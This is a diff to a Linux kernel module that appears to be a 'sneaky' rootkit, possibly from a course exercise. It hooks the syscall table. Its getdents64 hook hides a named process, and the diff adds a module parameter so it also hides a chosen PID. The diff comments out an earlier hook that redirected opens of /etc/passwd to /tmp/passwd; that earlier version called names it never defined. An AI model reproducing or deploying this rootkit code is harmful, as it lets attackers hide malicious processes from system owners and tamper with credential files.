@@ -22,6 +22,8 @@ static unsigned long *sys_call_table;
 //   char d_name[]; /* Filename (null-terminated) */
 // };
 
+static char* sneaky_pid = "";
+module_param(sneaky_pid, charp, 0000);
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -45,7 +47,8 @@ int disable_page_rw(void *ptr){
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
 
-asmlinkage int (*original_getdents64)(struct pt_regs *regs);
+//MODULE_PARM_DESC(process_id, "The process id of sneaky program");
+asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 {
@@ -56,7 +59,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   nread = original_getdents64(regs);
   for(bpos=0;bpos<nread;){
     d = (struct linux_dirent64 *)((char *)regs->si + bpos);
-    if (strcmp(d->d_name, "sneaky_process") == 0){
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0){
       int current_size = d->d_reclen;
       int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
       void* source = (char*)d + current_size;
@@ -68,7 +71,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   return nread;
 }
 
-asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
   ssize_t nread = original_read(regs);
@@ -89,18 +92,32 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
 }
 
 
-asmlinkage int (*original_openat)(struct pt_regs *regs);
+asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  // Implement the sneaky part here
-  if (strcmp((const char *)(regs -> si), "/etc/passwd") == 0) {
-    char newPath[] = "/tmp/passwd";
-    copy_to_user((void *)pathname, newPath,strlen(newPath)); 
-  }
-  return original_call(pathname, flags);
-
+  // const char *pathname = (const char *)regs->si;
+  // // Implement the sneaky part here
+  // if (strcmp(pathname, "/etc/passwd") == 0) {
+  //     char new_path[150] = "/tmp/passwd";
+  //     int path_len = strlen(new_path) + 1; // Add 1 for the null terminator
+  //     if (copy_to_user((void *)regs->si, new_path, path_len)) {
+  //       printk(KERN_ERR "copy_to_user failed\n");
+  //     }
+  //     printk(KERN_INFO "Sneaky openat is called.\n");
+  // }
+  //-------------------------------------------------------------
+  // const char *pathname = (const char *)regs->si;
+  // // Implement the sneaky part here
+  // if (strcmp(pathname, "/etc/passwd") == 0) {
+  //     char new_path[150];
+  //     copy_to_user();
+  //     // Make sure the new path is null-terminated
+  //     new_path[sizeof(new_path) - 1] = '\0';
+  //     pathname = new_path;
+  //     printk(KERN_INFO "Sneaky openat is called.\n");
+  //   }
   return (*original_openat)(regs);
 }
 
